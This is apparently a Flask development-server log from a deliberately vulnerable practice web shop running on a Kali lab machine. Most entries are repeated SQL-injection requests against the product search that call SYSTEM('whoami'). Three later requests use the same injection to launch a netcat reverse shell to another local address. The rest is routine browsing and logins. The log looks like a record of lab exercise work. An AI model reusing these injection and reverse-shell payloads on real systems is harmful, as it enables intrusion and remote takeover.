+2025-08-18 18:02:12,887 - 192.168.0.241 - - [18/Aug/2025 18:02:12] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:13,027 - 192.168.0.241 - - [18/Aug/2025 18:02:13] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:02:13,062 - 192.168.0.241 - - [18/Aug/2025 18:02:13] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:13,357 - 192.168.0.241 - - [18/Aug/2025 18:02:13] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:02:13,380 - 192.168.0.241 - - [18/Aug/2025 18:02:13] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:19,782 - 192.168.0.241 - - [18/Aug/2025 18:02:19] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:02:19,805 - 192.168.0.241 - - [18/Aug/2025 18:02:19] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:19,847 - 192.168.0.241 - - [18/Aug/2025 18:02:19] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:02:28,216 - 192.168.0.241 - - [18/Aug/2025 18:02:28] "GET /static/icons/site.webmanifest HTTP/1.1" 200 -
+2025-08-18 18:02:32,504 - 192.168.0.241 - - [18/Aug/2025 18:02:32] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:02:32,537 - 192.168.0.241 - - [18/Aug/2025 18:02:32] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:32,607 - 192.168.0.241 - - [18/Aug/2025 18:02:32] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:32,630 - 192.168.0.241 - - [18/Aug/2025 18:02:32] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:02:33,136 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:02:33,167 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:33,233 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:33,261 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:02:33,331 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:02:33,356 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:33,425 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:33,450 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:02:33,524 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:02:33,553 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:33,616 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:33,640 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:02:33,726 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:02:33,755 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:33,819 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:33,843 - 192.168.0.241 - - [18/Aug/2025 18:02:33] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:02:35,212 - 192.168.0.241 - - [18/Aug/2025 18:02:35] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:02:35,245 - 192.168.0.241 - - [18/Aug/2025 18:02:35] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:35,311 - 192.168.0.241 - - [18/Aug/2025 18:02:35] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:35,338 - 192.168.0.241 - - [18/Aug/2025 18:02:35] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:02:35,399 - 192.168.0.241 - - [18/Aug/2025 18:02:35] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:02:35,422 - 192.168.0.241 - - [18/Aug/2025 18:02:35] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:35,489 - 192.168.0.241 - - [18/Aug/2025 18:02:35] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:35,513 - 192.168.0.241 - - [18/Aug/2025 18:02:35] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:02:35,583 - 192.168.0.241 - - [18/Aug/2025 18:02:35] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:02:35,612 - 192.168.0.241 - - [18/Aug/2025 18:02:35] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:35,680 - 192.168.0.241 - - [18/Aug/2025 18:02:35] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:02:35,718 - 192.168.0.241 - - [18/Aug/2025 18:02:35] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:02:48,930 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/img.py', reloading
+2025-08-18 18:02:48,981 -  * Restarting with stat
+2025-08-18 18:02:49,176 -  * Debugger is active!
+2025-08-18 18:02:49,177 -  * Debugger PIN: 130-425-084
+2025-08-18 18:03:01,727 - 192.168.0.241 - - [18/Aug/2025 18:03:01] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:03:01,765 - 192.168.0.241 - - [18/Aug/2025 18:03:01] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-18 18:03:01,884 - 192.168.0.241 - - [18/Aug/2025 18:03:01] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:03:27,387 - 192.168.0.241 - - [18/Aug/2025 18:03:27] "[36mGET /static/icons/site.webmanifest HTTP/1.1[0m" 304 -
+2025-08-18 18:03:48,373 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 18:03:48,426 -  * Restarting with stat
+2025-08-18 18:03:48,646 -  * Debugger is active!
+2025-08-18 18:03:48,646 -  * Debugger PIN: 130-425-084
+2025-08-18 18:03:49,175 - 192.168.0.241 - - [18/Aug/2025 18:03:49] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:03:49,215 - 192.168.0.241 - - [18/Aug/2025 18:03:49] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:03:49,337 - 192.168.0.241 - - [18/Aug/2025 18:03:49] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:03:50,067 - 192.168.0.241 - - [18/Aug/2025 18:03:50] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:03:50,097 - 192.168.0.241 - - [18/Aug/2025 18:03:50] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:03:50,205 - 192.168.0.241 - - [18/Aug/2025 18:03:50] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:03:50,716 - 192.168.0.241 - - [18/Aug/2025 18:03:50] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:03:50,746 - 192.168.0.241 - - [18/Aug/2025 18:03:50] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:03:50,864 - 192.168.0.241 - - [18/Aug/2025 18:03:50] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:03:50,989 - 192.168.0.241 - - [18/Aug/2025 18:03:50] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:03:51,016 - 192.168.0.241 - - [18/Aug/2025 18:03:51] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:03:51,136 - 192.168.0.241 - - [18/Aug/2025 18:03:51] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:03:51,417 - 192.168.0.241 - - [18/Aug/2025 18:03:51] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:03:51,445 - 192.168.0.241 - - [18/Aug/2025 18:03:51] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:03:51,560 - 192.168.0.241 - - [18/Aug/2025 18:03:51] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:03:51,690 - 192.168.0.241 - - [18/Aug/2025 18:03:51] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:03:51,713 - 192.168.0.241 - - [18/Aug/2025 18:03:51] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:03:51,808 - 192.168.0.241 - - [18/Aug/2025 18:03:51] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:03:51,949 - 192.168.0.241 - - [18/Aug/2025 18:03:51] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:03:51,979 - 192.168.0.241 - - [18/Aug/2025 18:03:51] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:03:52,059 - 192.168.0.241 - - [18/Aug/2025 18:03:52] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:03:52,173 - 192.168.0.241 - - [18/Aug/2025 18:03:52] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:03:52,200 - 192.168.0.241 - - [18/Aug/2025 18:03:52] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:03:52,305 - 192.168.0.241 - - [18/Aug/2025 18:03:52] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:05:18,980 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 18:05:19,027 -  * Restarting with stat
+2025-08-18 18:05:19,261 -  * Debugger is active!
+2025-08-18 18:05:19,262 -  * Debugger PIN: 130-425-084
+2025-08-18 18:05:19,966 - 192.168.0.241 - - [18/Aug/2025 18:05:19] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:05:20,009 - 192.168.0.241 - - [18/Aug/2025 18:05:20] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:05:20,265 - 192.168.0.241 - - [18/Aug/2025 18:05:20] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:05:39,339 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 18:05:39,386 -  * Restarting with stat
+2025-08-18 18:05:39,578 -  * Debugger is active!
+2025-08-18 18:05:39,578 -  * Debugger PIN: 130-425-084
+2025-08-18 18:05:45,092 - 192.168.0.241 - - [18/Aug/2025 18:05:45] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:05:45,128 - 192.168.0.241 - - [18/Aug/2025 18:05:45] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:05:45,266 - 192.168.0.241 - - [18/Aug/2025 18:05:45] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:06:41,792 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 18:06:41,868 -  * Restarting with stat
+2025-08-18 18:06:42,121 -  * Debugger is active!
+2025-08-18 18:06:42,121 -  * Debugger PIN: 130-425-084
+2025-08-18 18:06:42,377 - 192.168.0.241 - - [18/Aug/2025 18:06:42] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:06:42,459 - 192.168.0.241 - - [18/Aug/2025 18:06:42] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:06:42,535 - 192.168.0.241 - - [18/Aug/2025 18:06:42] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:07:03,765 - 192.168.0.241 - - [18/Aug/2025 18:07:03] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:07:03,799 - 192.168.0.241 - - [18/Aug/2025 18:07:03] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:07:03,899 - 192.168.0.241 - - [18/Aug/2025 18:07:03] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:07:04,371 - 192.168.0.241 - - [18/Aug/2025 18:07:04] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:07:04,417 - 192.168.0.241 - - [18/Aug/2025 18:07:04] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:07:04,473 - 192.168.0.241 - - [18/Aug/2025 18:07:04] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:07:04,641 - 192.168.0.241 - - [18/Aug/2025 18:07:04] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:07:04,667 - 192.168.0.241 - - [18/Aug/2025 18:07:04] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:07:04,749 - 192.168.0.241 - - [18/Aug/2025 18:07:04] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:07:04,847 - 192.168.0.241 - - [18/Aug/2025 18:07:04] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:07:04,886 - 192.168.0.241 - - [18/Aug/2025 18:07:04] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:07:04,978 - 192.168.0.241 - - [18/Aug/2025 18:07:04] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:07:05,179 - 192.168.0.241 - - [18/Aug/2025 18:07:05] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:07:05,227 - 192.168.0.241 - - [18/Aug/2025 18:07:05] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:07:05,312 - 192.168.0.241 - - [18/Aug/2025 18:07:05] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 18:07:43,343 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-18 18:07:43,397 -  * Restarting with stat
+2025-08-18 18:07:43,619 -  * Debugger is active!
+2025-08-18 18:07:43,619 -  * Debugger PIN: 130-425-084
+2025-08-18 18:07:45,999 - 192.168.0.241 - - [18/Aug/2025 18:07:45] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 18:07:46,042 - 192.168.0.241 - - [18/Aug/2025 18:07:46] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 18:07:46,130 - 192.168.0.241 - - [18/Aug/2025 18:07:46] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 22:48:02,046 - 192.168.0.241 - - [18/Aug/2025 22:48:02] "GET /products?search='+UNION+SELECT+1,SYSTEM('whoami'),4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 22:48:02,090 - 192.168.0.241 - - [18/Aug/2025 22:48:02] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 22:48:02,677 - 192.168.0.241 - - [18/Aug/2025 22:48:02] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-18 22:49:09,261 - 192.168.0.241 - - [18/Aug/2025 22:49:09] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 22:49:09,309 - 192.168.0.241 - - [18/Aug/2025 22:49:09] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 22:49:35,633 - 192.168.0.241 - - [18/Aug/2025 22:49:35] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 22:49:35,676 - 192.168.0.241 - - [18/Aug/2025 22:49:35] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-18 22:49:42,843 - 192.168.0.241 - - [18/Aug/2025 22:49:42] "GET /products?search='+UNION+SELECT+1,SYSTEM('nc+-e+/bin/bash+192.168.0.105+4444'),3,4,5,6,7,8+FROM+products-- HTTP/1.1" 200 -
+2025-08-18 22:49:42,879 - 192.168.0.241 - - [18/Aug/2025 22:49:42] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-19 12:09:23,952 - 192.168.0.241 - - [19/Aug/2025 12:09:23] "GET / HTTP/1.1" 200 -
+2025-08-19 12:10:34,771 - 192.168.0.241 - - [19/Aug/2025 12:10:34] "GET / HTTP/1.1" 200 -
+2025-08-19 12:10:34,885 - 192.168.0.241 - - [19/Aug/2025 12:10:34] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-19 12:11:01,981 - 192.168.0.241 - - [19/Aug/2025 12:11:01] "[36mGET /static/icons/site.webmanifest HTTP/1.1[0m" 304 -
+2025-08-19 12:11:10,103 - 192.168.0.241 - - [19/Aug/2025 12:11:10] "GET /cart HTTP/1.1" 200 -
+2025-08-19 12:11:12,375 - 192.168.0.241 - - [19/Aug/2025 12:11:12] "GET / HTTP/1.1" 200 -
+2025-08-19 12:11:21,671 - 192.168.0.241 - - [19/Aug/2025 12:11:21] "GET / HTTP/1.1" 200 -
+2025-08-19 12:11:21,767 - 192.168.0.241 - - [19/Aug/2025 12:11:21] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-19 12:11:25,760 - 192.168.0.241 - - [19/Aug/2025 12:11:25] "GET / HTTP/1.1" 200 -
+2025-08-19 12:11:25,837 - 192.168.0.241 - - [19/Aug/2025 12:11:25] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-19 12:11:37,759 - 192.168.0.221 - - [19/Aug/2025 12:11:37] "GET / HTTP/1.1" 200 -
+2025-08-19 12:11:45,303 - 192.168.0.221 - - [19/Aug/2025 12:11:45] "[32mGET /products HTTP/1.1[0m" 302 -
+2025-08-19 12:11:45,352 - 192.168.0.221 - - [19/Aug/2025 12:11:45] "GET /login HTTP/1.1" 200 -
+2025-08-19 12:11:47,305 - 192.168.0.221 - - [19/Aug/2025 12:11:47] "[32mPOST /login HTTP/1.1[0m" 302 -
+2025-08-19 12:11:47,347 - 192.168.0.221 - - [19/Aug/2025 12:11:47] "GET /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-19 12:11:49,756 - 192.168.0.221 - - [19/Aug/2025 12:11:49] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-19 12:11:51,778 - 192.168.0.221 - - [19/Aug/2025 12:11:51] "POST /shop_admin/whyYouMad HTTP/1.1" 200 -
+2025-08-19 12:12:45,704 - 192.168.0.221 - - [19/Aug/2025 12:12:45] "GET / HTTP/1.1" 200 -
+2025-08-19 12:12:46,997 - 192.168.0.221 - - [19/Aug/2025 12:12:46] "GET /products HTTP/1.1" 200 -
+2025-08-19 12:12:47,058 - 192.168.0.221 - - [19/Aug/2025 12:12:47] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-19 12:13:42,773 - 192.168.0.221 - - [19/Aug/2025 12:13:42] "GET /products HTTP/1.1" 200 -
+2025-08-19 12:13:42,833 - 192.168.0.221 - - [19/Aug/2025 12:13:42] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-19 12:13:43,070 - 192.168.0.221 - - [19/Aug/2025 12:13:43] "GET /static/icons/apple-touch-icon.png HTTP/1.1" 200 -
+2025-08-19 12:13:43,073 - 192.168.0.221 - - [19/Aug/2025 12:13:43] "GET /static/icons/favicon-32x32.png HTTP/1.1" 200 -
+2025-08-19 12:13:47,500 - 192.168.0.221 - - [19/Aug/2025 12:13:47] "GET /products HTTP/1.1" 200 -
+2025-08-19 12:13:47,557 - 192.168.0.221 - - [19/Aug/2025 12:13:47] "GET /static/images/hacked.jpg HTTP/1.1" 200 -
+2025-08-19 12:13:50,500 - 192.168.0.221 - - [19/Aug/2025 12:13:50] "GET /static/icons/favicon-32x32.png HTTP/1.1" 200 -
+2025-08-19 12:13:50,503 - 192.168.0.221 - - [19/Aug/2025 12:13:50] "[36mGET /static/icons/apple-touch-icon.png HTTP/1.1[0m" 304 -
+2025-08-19 12:13:55,598 - 192.168.0.241 - - [19/Aug/2025 12:13:55] "GET / HTTP/1.1" 200 -
+2025-08-19 12:13:55,711 - 192.168.0.241 - - [19/Aug/2025 12:13:55] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-19 12:14:43,670 - 192.168.0.221 - - [19/Aug/2025 12:14:43] "GET / HTTP/1.1" 200 -
+2025-08-19 12:15:47,472 - 192.168.0.221 - - [19/Aug/2025 12:15:47] "GET / HTTP/1.1" 200 -
+2025-08-19 12:15:47,620 - 192.168.0.221 - - [19/Aug/2025 12:15:47] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-19 12:15:47,626 - 192.168.0.221 - - [19/Aug/2025 12:15:47] "[36mGET /static/icons/apple-touch-icon.png HTTP/1.1[0m" 304 -
+2025-08-19 12:16:26,357 - 192.168.0.241 - - [19/Aug/2025 12:16:26] "GET / HTTP/1.1" 200 -
+2025-08-19 12:16:26,487 - 192.168.0.241 - - [19/Aug/2025 12:16:26] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-19 12:17:09,431 - 192.168.0.241 - - [19/Aug/2025 12:17:09] "GET / HTTP/1.1" 200 -
+2025-08-19 12:17:09,527 - 192.168.0.241 - - [19/Aug/2025 12:17:09] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-19 12:17:16,309 - 192.168.0.221 - - [19/Aug/2025 12:17:16] "GET / HTTP/1.1" 200 -
+2025-08-19 12:17:16,438 - 192.168.0.221 - - [19/Aug/2025 12:17:16] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-19 12:17:16,439 - 192.168.0.221 - - [19/Aug/2025 12:17:16] "[36mGET /static/icons/apple-touch-icon.png HTTP/1.1[0m" 304 -
+2025-08-19 12:17:54,970 - 192.168.0.221 - - [19/Aug/2025 12:17:54] "GET /browse_files HTTP/1.1" 200 -
+2025-08-19 12:17:57,118 - 192.168.0.221 - - [19/Aug/2025 12:17:57] "[32mGET /logout HTTP/1.1[0m" 302 -
+2025-08-19 12:17:57,141 - 192.168.0.221 - - [19/Aug/2025 12:17:57] "GET / HTTP/1.1" 200 -
+2025-08-19 12:17:58,541 - 192.168.0.221 - - [19/Aug/2025 12:17:58] "[32mGET /products HTTP/1.1[0m" 302 -
+2025-08-19 12:17:58,558 - 192.168.0.221 - - [19/Aug/2025 12:17:58] "GET /login HTTP/1.1" 200 -
+2025-08-19 12:18:05,560 - 192.168.0.241 - - [19/Aug/2025 12:18:05] "[32mGET /logout HTTP/1.1[0m" 302 -
+2025-08-19 12:18:05,566 - 192.168.0.241 - - [19/Aug/2025 12:18:05] "GET / HTTP/1.1" 200 -
+2025-08-19 12:18:06,790 - 192.168.0.241 - - [19/Aug/2025 12:18:06] "GET /login HTTP/1.1" 200 -
+2025-08-19 12:18:12,849 - 192.168.0.241 - - [19/Aug/2025 12:18:12] "[32mPOST /login HTTP/1.1[0m" 302 -
+2025-08-19 12:18:12,855 - 192.168.0.241 - - [19/Aug/2025 12:18:12] "GET /products HTTP/1.1" 200 -
+2025-08-19 12:18:12,884 - 192.168.0.241 - - [19/Aug/2025 12:18:12] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-19 12:18:16,703 - 192.168.0.241 - - [19/Aug/2025 12:18:16] "GET / HTTP/1.1" 200 -
+2025-08-19 12:18:43,277 - 192.168.0.241 - - [19/Aug/2025 12:18:43] "GET / HTTP/1.1" 200 -
+2025-08-19 12:18:43,345 - 192.168.0.241 - - [19/Aug/2025 12:18:43] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-19 12:18:44,593 - 192.168.0.241 - - [19/Aug/2025 12:18:44] "GET / HTTP/1.1" 200 -
+2025-08-19 12:18:46,201 - 192.168.0.241 - - [19/Aug/2025 12:18:46] "GET / HTTP/1.1" 200 -
+2025-08-19 12:18:48,495 - 192.168.0.241 - - [19/Aug/2025 12:18:48] "GET /products HTTP/1.1" 200 -
+2025-08-19 12:18:48,513 - 192.168.0.241 - - [19/Aug/2025 12:18:48] "[36mGET /static/images/hacked.jpg HTTP/1.1[0m" 304 -
+2025-08-19 12:18:50,884 - 192.168.0.241 - - [19/Aug/2025 12:18:50] "GET / HTTP/1.1" 200 -
+2025-08-19 12:21:09,914 -  * Detected change in '/home/kali/vulnstore_repo/vuln_store/routes/products.py', reloading
+2025-08-19 12:21:10,111 -  * Restarting with stat
+2025-08-19 12:21:10,563 -  * Debugger is active!
+2025-08-19 12:21:10,564 -  * Debugger PIN: 130-425-084
+2025-08-19 12:21:10,728 - 192.168.0.241 - - [19/Aug/2025 12:21:10] "GET / HTTP/1.1" 200 -
+2025-08-19 12:21:10,810 - 192.168.0.241 - - [19/Aug/2025 12:21:10] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-19 12:21:11,380 - 192.168.0.241 - - [19/Aug/2025 12:21:11] "GET / HTTP/1.1" 200 -
+2025-08-19 12:21:11,444 - 192.168.0.241 - - [19/Aug/2025 12:21:11] "[36mGET /static/icons/favicon-32x32.png HTTP/1.1[0m" 304 -
+2025-08-19 12:21:13,004 - 192.168.0.241 - - [19/Aug/2025 12:21:13] "[32mGET /logout HTTP/1.1[0m" 302 -
+2025-08-19 12:21:13,013 - 192.168.0.241 - - [19/Aug/2025 12:21:13] "GET / HTTP/1.1" 200 -
+2025-08-19 12:21:14,247 - 192.168.0.241 - - [19/Aug/2025 12:21:14] "[32mGET /products HTTP/1.1[0m" 302 -
+2025-08-19 12:21:14,255 - 192.168.0.241 - - [19/Aug/2025 12:21:14] "GET /login HTTP/1.1" 200 -
